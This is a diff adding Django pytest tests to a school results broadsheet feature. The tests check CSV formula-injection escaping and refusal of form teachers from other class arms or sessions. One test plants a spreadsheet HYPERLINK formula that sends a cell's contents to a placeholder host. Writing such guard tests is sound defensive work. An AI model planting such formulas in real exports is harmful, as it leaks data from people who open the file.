@@ -2,13 +2,17 @@
 
 import csv
 import io
+from datetime import date
 from decimal import Decimal
 
 import pytest
 from django.urls import reverse
 from django_tenants.utils import schema_context
 
+from apps.academics.models import AcademicSession, ClassArm, ClassLevel, FormTeacher
+from apps.accounts.roles import set_roles
 from apps.results.models import ClassResult, ResultSummary, SubjectResult
+from tests.accounts.factories import StaffFactory
 from tests.accounts.helpers import login_verified
 from tests.results.factories import accuracy_world, approve_and_compute
 from tests.results.test_accuracy import EXPECTED_STATS, EXPECTED_SUBJECTS, SUBJECTS
@@ -199,3 +203,38 @@ def test_broadsheet_link_on_class_status_page(client_a, computed):
     html = client_a.get(reverse("results:class_status", args=[w.arm.pk])).content.decode()
     assert url(w) in html
     assert ResultSummary.objects.filter(arm=w.arm, term=w.term).count() == 6
+
+
+def test_csv_header_subject_names_are_guarded(client_a, computed):
+    w = computed
+    evil = '=HYPERLINK("http://x/?"&A2,"Maths")'
+    SubjectResult.objects.filter(offering=w.offerings["Mathematics"], term=w.term).update(
+        subject_name=evil
+    )
+    login_verified(client_a, w.principal)
+    r = client_a.get(url(w, "results:broadsheet_csv"))
+    header = next(csv.reader(io.StringIO(r.content.decode())))
+    assert "'" + evil in header
+    assert evil not in header
+
+
+def test_form_teacher_of_another_arm_or_session_is_refused(client_a, computed):
+    w = computed
+    level = ClassLevel.objects.create(name="JSS 8", section="jss", order=98)
+    other_arm = ClassArm.objects.create(level=level, suffix="Q")
+    other_ft = StaffFactory()
+    set_roles(other_ft, ["teacher"], by=None)
+    FormTeacher.objects.create(arm=other_arm, session=w.session, teacher=other_ft)
+    client_a.force_login(other_ft)
+    assert client_a.get(url(w)).status_code == 403
+    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403
+
+    later = AcademicSession.objects.create(
+        name="2027/2028", start_date=date(2027, 9, 1), end_date=date(2028, 7, 31)
+    )
+    next_ft = StaffFactory()
+    set_roles(next_ft, ["teacher"], by=None)
+    FormTeacher.objects.create(arm=w.arm, session=later, teacher=next_ft)
+    client_a.force_login(next_ft)  # this arm's form teacher, but in another session
+    assert client_a.get(url(w)).status_code == 403
+    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403
